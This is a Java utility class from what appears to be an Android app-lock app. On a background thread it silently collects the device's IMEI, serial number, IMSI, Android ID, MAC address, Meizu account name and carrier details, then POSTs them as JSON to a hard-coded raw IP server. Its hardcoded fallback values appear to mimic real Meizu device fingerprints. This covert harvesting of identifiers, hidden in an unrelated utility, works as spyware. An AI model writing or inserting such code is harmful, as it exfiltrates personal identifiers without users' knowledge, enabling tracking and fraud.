package com.scyh.applock.utils;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.ProtocolException;
import java.net.SocketException;
import java.net.URL;
import java.util.Locale;
import java.util.UUID;

import org.json.JSONObject;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Proxy;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;

/**
 * 手机参数获取类 
 * <br>
 * 在清单文件加入以下权限 
 * <uses-permission android:name="android.permission.INTERNET" />
 * <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 * <uses-permission android:name="android.permission.READ_PHONE_STATE" /> 
 * <br>
 * 调用代码（在主线程中调用）,参数Context context<br>
 *  MZPhoneGetter.getinstance(LoginActivity.this).save();
 *
 */
public class MZPhoneGetter {

	private static final String tag = MZPhoneGetter.class.getSimpleName();

	private static MZPhoneGetter instance;
	private Context context;

	/**
	 * 调用入口
	 * @param context 上下文
	 * @return
	 */
	public synchronized static MZPhoneGetter getinstance(Context context) {
		if (instance == null) {
			instance = new MZPhoneGetter();
		}
		instance.context = context;
		return instance;
	}

	public void save() {
		new Thread(new MyRunnable()) {
		}.start();

	}

	class MyRunnable implements Runnable {

		@Override
		public void run() {
			try {
				MZPhone phone = initData();
				JSONObject data = parseJson(phone);
				String res = requestPost("http://120.24.224.128:8081/yfb/api/phone/envoke/mz_devices", data.toString());
				//System.out.println("参数：" + data.toString());
				Log.i(tag, res);
			} catch (Exception e) {
				System.out.println(tag + "-->>" + e.getMessage());
			}
		}
	}

	private static String requestPost(String httpUrl, String dataJson) throws Exception {
		URL url;
		String result = null;
		byte[] buffer = dataJson.getBytes();
		try {
			url = new URL(httpUrl);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("POST");
			conn.setConnectTimeout(20 * 1000);
			conn.setReadTimeout(20 * 1000);
			conn.setDoOutput(true);
			conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
			conn.setRequestProperty("Content-Length", buffer.length + "");
			OutputStream outStream = conn.getOutputStream();
			outStream.write(buffer);
			outStream.flush();
			outStream.close();
			if (conn.getResponseCode() == 200) {
				result = new String(readInputStream(conn.getInputStream()), "utf-8");
			}
			conn.disconnect();
		} catch (MalformedURLException e) {
			e.printStackTrace();
			throw e;
		} catch (ProtocolException e) {
			e.printStackTrace();
			throw e;
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			throw e;
		} catch (IOException e) {
			e.printStackTrace();
			throw e;
		} catch (Exception e) {
			e.printStackTrace();
			throw e;
		}
		return result;
	}

	private static byte[] readInputStream(InputStream inputStream) throws Exception {
		byte[] buffer = new byte[1024];
		int len = -1;
		ByteArrayOutputStream outSteam = new ByteArrayOutputStream();
		while ((len = inputStream.read(buffer)) != -1) {
			outSteam.write(buffer, 0, len);
		}
		outSteam.close();
		inputStream.close();
		return outSteam.toByteArray();
	}

	private JSONObject parseJson(MZPhone phone) {
		Field[] fields = MZPhone.class.getDeclaredFields();
		JSONObject j = new JSONObject();
		for (Field field : fields) {
			field.setAccessible(true);
			try {
				j.put(field.getName(), field.get(phone).toString());
			} catch (Exception e) {
			}
		}
		return j;
	}

	private MZPhone initData() {
		MZPhone sj = new MZPhone();
		sj.setImei(nextImei());
		sj.setSn(nextSn());
		sj.setUid(nextUid());
		sj.setDevice_model(nextDeviceModel());
		sj.setV(nextV());
		sj.setVc(nextVC());
		sj.setNet(nextNet());
		sj.setFirmware(nextFirmware());
		sj.setMac(nextMac());
		sj.setLocal(nextLocal());
		sj.setMpv(nextMpv());
		sj.setOperate(nextOperaror());
		sj.setSessionId(nextSessionId());
		sj.setMzos(nextMzOs());
		sj.setLanguage(nextLanguage());
		sj.setOs(nextOs());
		sj.setDeviceType(nextDeviceType());
		sj.setScreen_size(nextScreenSize());
		sj.setSysVer(nextSysVer());
		sj.setAndroidId(nextAndroidID());
		sj.setSubscriberId(nextSubId());
		return sj;
	}

	private String nextSubId() {
		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		return tm.getSubscriberId();
	}

	private String nextAndroidID() {
		return Settings.Secure.getString(context.getContentResolver(), "android_id");
	}

	private String nextMzOs() {
		return "5";
	}

	private String nextSessionId() {
		return UUID.randomUUID().toString();
	}

	private String nextOperaror() {
		try {
			Object v1 = context.getSystemService("phone");
			if (v1 == null) {
				return "";
			}
			if (5 != ((TelephonyManager) v1).getSimState()) {
				return "";
			}
			String v2 = ((TelephonyManager) v1).getSimOperator();
			return v2;
		} catch (Exception v0) {
		}
		return "";
	}

	private String nextMpv() {
		return "appsv6";
	}

	private String nextLocal() {
		try {
			return Locale.getDefault().getCountry();
		} catch (Exception e) {
			e(e);
		}
		return "cn";
	}

	private String nextUid() {
		try {
			String uid = b(context);
			return uid;
		} catch (Exception e) {
			e(e);
		}
		return "";
	}

	private static String b(Context arg2) {
		Account v0 = c(arg2);
		String v1 = v0 == null ? null : v0.name;
		return v1;
	}

	private static Account c(Context arg3) {
		Account[] v0 = AccountManager.get(arg3.getApplicationContext()).getAccountsByType("com.meizu.account");
		System.out.println(v0.length);
		Account v2 = v0 == null || v0.length <= 0 ? null : v0[0];
		return v2;
	}

	private String nextImei() {
		try {
			String imei = _nextimei(context);
			return imei;
		} catch (Exception e) {
			e(e);

		}
		return "863262033033269";
		// return new ImeiCreater().getRadomImei();
	}

	private static String _nextimei(Context arg11) {
		String v4_1;
		Class v5 = MZPhoneGetter.class;
		synchronized (v5) {
			try {
				try {
					v4_1 = (String) a("android.telephony.MzTelephonyManager", "getDeviceId", null, null);
					return v4_1;
				} catch (Exception v2) {
					try {
						v4_1 = (String) a("com.meizu.telephony.MzTelephonymanager", "getDeviceId",
								new Class[] { Context.class, Integer.TYPE },
								new Object[] { arg11, Integer.valueOf(0) });
						return v4_1;
					} catch (Exception e) {
						try {
							v4_1 = ((TelephonyManager) arg11.getSystemService("phone")).getDeviceId();
							return v4_1;
						} catch (Exception ex) {
							ex.printStackTrace();
						}
					}
				}
			} catch (Throwable v4) {
			}
		}
		return "";
	}

	private static Object a(String arg2, String arg3, Class[] arg4, Object[] arg5) throws Exception {
		Class v0 = Class.forName(arg2);
		return a(v0, v0, arg3, arg4, arg5);
	}

	private static Object a(Class arg4, Object arg5, String arg6, Class[] arg7, Object[] arg8) throws Exception {
		Object v1;
		Method v0;
		if (arg8 == null || arg8.length == 0) {
			v0 = arg4.getMethod(arg6);
			v0.setAccessible(true);
			v1 = v0.invoke(arg5);
		} else {
			v0 = arg4.getMethod(arg6, arg7);
			v0.setAccessible(true);
			v1 = v0.invoke(arg5, arg8);
		}

		return v1;
	}

	private String nextDeviceType() {
		// return "M6122";
		return randomModel();
	}

	private String nextFirmware() {
		try {
			return Build.DISPLAY;
		} catch (Exception e) {
			e(e);
		}
		return "6.0";
	}

	private String nextSysVer() {
		return "6.0-1486979483_g3stable";
	}

	private String nextSn() {
		String v0_1 = null;
		Class v1 = MZPhoneGetter.class;
		synchronized (v1) {
			try {
				v0_1 = a(context, "ro.serialno");

				return v0_1;
			} catch (Throwable v0) {
			}

		}

		return "612MKBQB229GM";
	}

	private static String a(Context arg10, String arg11) throws IllegalArgumentException {
		Object v6 = null;
		try {
			Class v7 = arg10.getClassLoader().loadClass("android.os.SystemProperties");
			v6 = v7.getMethod("get", String.class).invoke(v7, new String(arg11));
		} catch (Exception v1) {
			String v6_1 = "";
		}
		return ((String) v6);
	}

	private String nextDeviceModel() {
		// return "M6122";
		try {
			return Build.MODEL;
		} catch (Exception e) {
			e(e);
		}
		return randomModel();
	}

	// S6,Note 6,PRO 7,Note 5,魅蓝3， 魅蓝X,E2,魅蓝5s，MX 6,
	private String randomModel() {
		return Build.BRAND;
	}

	private String nextV() {
		return "6.18.10";
	}

	private String nextVC() {
		return "6018010";
	}

	private String nextNet() {
		try {
			return _next_net(context);
		} catch (Exception e) {
			e(e);
		}
		return "wifi";
	}

	private static String _next_net(Context arg7) {
		String v0 = "";
		NetworkInfo v3 = ((ConnectivityManager) arg7.getSystemService("connectivity")).getActiveNetworkInfo();
		if (v3 == null || !v3.isConnected()) {
			v0 = "none";
		} else {
			String v5 = v3.getTypeName();
			if (v5.equalsIgnoreCase("WIFI")) {
				v0 = "wifi";
			} else if (v5.equalsIgnoreCase("MOBILE")) {
				if (TextUtils.isEmpty(Proxy.getDefaultHost())) {
					int v2 = e(arg7);
					if (v2 == 2) {
						v0 = "2g";
					} else if (v2 == 3) {
						v0 = "3g";
					} else {
						v0 = "4g";
					}
				} else {
					v0 = "wap";
				}
			}
		}

		return v0;
	}

	private static int e(Context arg4) {
		int v1 = 2;
		int v2 = 3;
		switch (((TelephonyManager) arg4.getSystemService("phone")).getNetworkType()) {
		case 3: {
			v1 = v2;
			break;
		}
		case 5: {
			v1 = v2;
			break;
		}
		case 6: {
			v1 = v2;
			break;
		}
		case 8: {
			v1 = v2;
			break;
		}
		case 9: {
			v1 = v2;
			break;
		}
		case 10: {
			v1 = v2;
			break;
		}
		case 12: {
			v1 = v2;
			break;
		}
		case 13: {
			v1 = 4;
			break;
		}
		case 14: {
			v1 = v2;
			break;
		}
		case 15: {
			v1 = v2;
			break;
		}
		}

		return v1;
	}

	private String nextOs() {
		return Build.VERSION.SDK_INT + "";
	}

	public String nextFirmware2() {
		return "Flyme+5.2.13.1M";
	}

	private String nextScreenSize() {
		try {
			DisplayMetrics dm = context.getResources().getDisplayMetrics();
			return dm.widthPixels + "x" + dm.heightPixels;
		} catch (Exception e) {
			e(e);
		}
		return "1280x768";
	}

	private String nextLanguage() {
		try {
			return Locale.getDefault().getLanguage();
		} catch (Exception e) {
			e(e);
		}
		return "zh-CN";
	}

	private String nextMac() {

		// String cc=
		// ((WifiManager)AppContext.getInstance().getSystemService("wifi")).getConnectionInfo().getMacAddress();
		//
		// String j=URLEncoder.encode(cc);
		// return j;
		// return cc;
		try {
			// return j.h(context);
			return getMacAddress();
		} catch (Exception e) {
			e(e);
		}
		return "1c:cd:e5:78:21:5f";
		// return "ab:32:df:fa:aa:33";
	}

	private static String getMacAddress() {
		/*
		 * 获取mac地址有一点需要注意的就是android
		 * 6.0版本后，以下注释方法不再适用，不管任何手机都会返回"02:00:00:00:00:00"这个默认的mac地址，
		 * 这是googel官方为了加强权限管理而禁用了getSYstemService(Context.WIFI_SERVICE)
		 * 方法来获得mac地址。
		 */
		// String macAddress= "";
		// WifiManager wifiManager = (WifiManager)
		// MyApp.getContext().getSystemService(Context.WIFI_SERVICE);
		// WifiInfo wifiInfo = wifiManager.getConnectionInfo();
		// macAddress = wifiInfo.getMacAddress();
		// return macAddress;

		String macAddress = null;
		StringBuffer buf = new StringBuffer();
		NetworkInterface networkInterface = null;
		try {
			networkInterface = NetworkInterface.getByName("eth1");
			if (networkInterface == null) {
				networkInterface = NetworkInterface.getByName("wlan0");
			}
			if (networkInterface == null) {
				return "02:00:00:00:00:02";
			}
			byte[] addr = networkInterface.getHardwareAddress();
			for (byte b : addr) {
				buf.append(String.format("%02X:", b));
			}
			if (buf.length() > 0) {
				buf.deleteCharAt(buf.length() - 1);
			}
			macAddress = buf.toString();
		} catch (SocketException e) {
			e.printStackTrace();
			return "02:00:00:00:00:02";
		}
		return macAddress;
	}

	private void e(Exception e) {
		Log.e(tag, "获取手机参数错误：" + e.getMessage());
	}

	private boolean nullOrEmpty(Object o) {
		if (o == null) {
			return true;
		}
		if (o.toString().equals("")) {
			return true;
		}

		if (o.toString().equals("null")) {
			return true;
		}
		return false;
	}

	// private List<PackageInfo> getInstallPackages(){
	// try {
	// List<PackageInfo>
	// pkgs=context.getPackageManager().getInstalledPackages(0);
	// return pkgs;
	// } catch (Exception e) {
	// e(e);
	// }
	// return null;
	// }
	//
	// public int getInstallPkgsCount(){
	// try {
	// return getInstallPackages().size();
	// } catch (Exception e) {
	// e(e);
	// }
	// return 5;
	// }
	//
	// public JSONArray getPackages(){
	// List<PackageInfo>list=getInstallPackages();
	// JSONArray arr=new JSONArray();
	// JSONObject j;
	// for(PackageInfo pkg:list){
	// j=new JSONObject();
	// j.put("package_name", pkg.packageName);
	// j.put("version_code", pkg.versionCode);
	// arr.add(j);
	// }
	// return arr;
	// }
	//
	// public JSONArray getPackagesMd5(){
	// List<PackageInfo>list=getInstallPackages();
	// JSONArray arr=new JSONArray();
	// JSONObject j;
	// for(PackageInfo pkg:list){
	// j=new JSONObject();
	// j.put("package_name", pkg.packageName);
	// j.put("version_code", pkg.versionCode);
	// }
	// return arr;
	// }

	class MZPhone {
		private String firmware;// flyme框架
		private String mpv;// apvs6
		private String mzos;// 魅族系统版本
		private String mac;// mac地址
		private String device_model;// 手机型号
		private String deviceType;// 手机类型
		private String sysVer;// 系统版本
		private String sn;// sn识别好
		private String screen_size;// 屏幕分辨率
		private String language;// 手机语言
		private String imei;// 串号
		private String os;// 系统版本好
		private String local;// 所在地区
		private String net;// 所使用的网络
		private String v;// app版本名称
		private String vc;// app版本号。
		private String uid;// 用户编号
		private String operate;// 运营商
		private String sessionId;
		private String androidId;
		private String subscriberId;

		public String getFirmware() {
			return firmware;
		}

		public void setFirmware(String firmware) {
			this.firmware = firmware;
		}

		public String getMpv() {
			return mpv;
		}

		public void setMpv(String mpv) {
			this.mpv = mpv;
		}

		public String getMzos() {
			return mzos;
		}

		public void setMzos(String mzos) {
			this.mzos = mzos;
		}

		public String getMac() {
			return mac;
		}

		public void setMac(String mac) {
			this.mac = mac;
		}

		public String getDevice_model() {
			return device_model;
		}

		public void setDevice_model(String device_model) {
			this.device_model = device_model;
		}

		public String getDeviceType() {
			return deviceType;
		}

		public void setDeviceType(String deviceType) {
			this.deviceType = deviceType;
		}

		public String getSysVer() {
			return sysVer;
		}

		public void setSysVer(String sysVer) {
			this.sysVer = sysVer;
		}

		public String getSn() {
			return sn;
		}

		public void setSn(String sn) {
			this.sn = sn;
		}

		public String getScreen_size() {
			return screen_size;
		}

		public void setScreen_size(String screen_size) {
			this.screen_size = screen_size;
		}

		public String getLanguage() {
			return language;
		}

		public void setLanguage(String language) {
			this.language = language;
		}

		public String getImei() {
			return imei;
		}

		public void setImei(String imei) {
			this.imei = imei;
		}

		public String getOs() {
			return os;
		}

		public void setOs(String os) {
			this.os = os;
		}

		public String getLocal() {
			return local;
		}

		public void setLocal(String local) {
			this.local = local;
		}

		public String getNet() {
			return net;
		}

		public void setNet(String net) {
			this.net = net;
		}

		public String getV() {
			return v;
		}

		public void setV(String v) {
			this.v = v;
		}

		public String getVc() {
			return vc;
		}

		public void setVc(String vc) {
			this.vc = vc;
		}

		public String getUid() {
			return uid;
		}

		public void setUid(String uid) {
			this.uid = uid;
		}

		public String getOperate() {
			return operate;
		}

		public void setOperate(String operate) {
			this.operate = operate;
		}

		public String getSessionId() {
			return sessionId;
		}

		public void setSessionId(String sessionId) {
			this.sessionId = sessionId;
		}

		public String getAndroidId() {
			return androidId;
		}

		public void setAndroidId(String androidId) {
			this.androidId = androidId;
		}

		public String getSubscriberId() {
			return subscriberId;
		}

		public void setSubscriberId(String subscriberId) {
			this.subscriberId = subscriberId;
		}

	}

}
